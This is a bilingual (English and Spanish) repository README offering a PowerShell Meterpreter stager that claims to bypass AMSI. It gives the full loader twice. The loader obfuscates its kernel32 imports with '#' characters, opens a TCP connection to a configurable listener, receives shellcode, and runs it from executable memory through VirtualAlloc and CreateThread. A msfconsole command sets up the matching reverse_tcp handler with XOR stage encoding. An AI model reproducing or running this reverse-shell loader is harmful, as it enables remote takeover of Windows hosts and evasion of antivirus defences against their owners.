# Meterpreter-Powershell

This repo contains a simple meterpreter session in powershell bypassing amsi

1. [English](#English "Goto English")
2. [Code Meterpreter](#Code Meterpreter "Goto Code-Meterpreter")
3. [Use](#Use "Goto Use")
4. [Spanish](#Spanish "Goto Spanish")
5. [Codigo Meterpreter](#Codigo Meterpreter "Goto Codigo-Meterpreter")
6. [Uso](#Uso "Goto Uso")
7. [Video Poc](#Video Poc "Goto Video Poc")

## English 

# Code Meterpreter #

[!] This code meterpreter only work with Powershell 32 bits
Path Powershell 32 bits = %WinDir%\syswow64\windowspowershell\v1.0\powershell.exe
Replace "192.168.56.1" and 443, for your data

```
$ip = "192.168.56.1"; $port = 443; $c = @"
[D#ll#Imp#ort("ker#ne#l32.#dll")] publi#c static e#xtern In#tPtr Virt#ualAl#loc(Int#Ptr w, ui#nt x, ui#nt y, ui#nt z);
[Dl#lI##mpor#t("kern#el32.d#ll")] pub#lic st#atic ex#tern Int#Ptr Cr#eate#Thr#ead(Int#Ptr u, u#int v, IntP#tr w, Int#Ptr x, ui#nt y, IntPtr z);
"@.replace("#", "")
try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect($ip, $port) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
$y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None) }
for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Handle)[$i-1]}
$t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400;  Start-Sleep -Second 86400; Start-Sleep -Second 86400; Start-Sleep -Second 86400}catch{}
```

# Use #
Start msfconsole with next command, replace "YourIp" and "YourPort" for your data
```
msfconsole -x "set lhost YourIp; set lport YourPort; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
```

## Spanish

# Codigo Meterpreter #

[!] Este codigo de Meterpreter solo funciona en la PowerShell de 32 Bits 
Ruta Powershell de 32 bits = %WinDir%\syswow64\windowspowershell\v1.0\powershell.exe
Reemplaza "192.168.56.1 y 443, por tus datos

```
$ip = "192.168.56.1"; $port = 443; $c = @"
[D#ll#Imp#ort("ker#ne#l32.#dll")] publi#c static e#xtern In#tPtr Virt#ualAl#loc(Int#Ptr w, ui#nt x, ui#nt y, ui#nt z);
[Dl#lI##mpor#t("kern#el32.d#ll")] pub#lic st#atic ex#tern Int#Ptr Cr#eate#Thr#ead(Int#Ptr u, u#int v, IntP#tr w, Int#Ptr x, ui#nt y, IntPtr z);
"@.replace("#", "")
try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect($ip, $port) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
$y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None) }
for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Handle)[$i-1]}
$t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400;  Start-Sleep -Second 86400; Start-Sleep -Second 86400; Start-Sleep -Second 86400}catch{}
```

# Uso #
Inicia msfconsole con el siguiente comando, reemplaza "TuIp" y "TuPuerto" por tus datos respectivos
```
msfconsole -x "set lhost TuIp; set lport TuPuerto; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
```

# Video Poc #



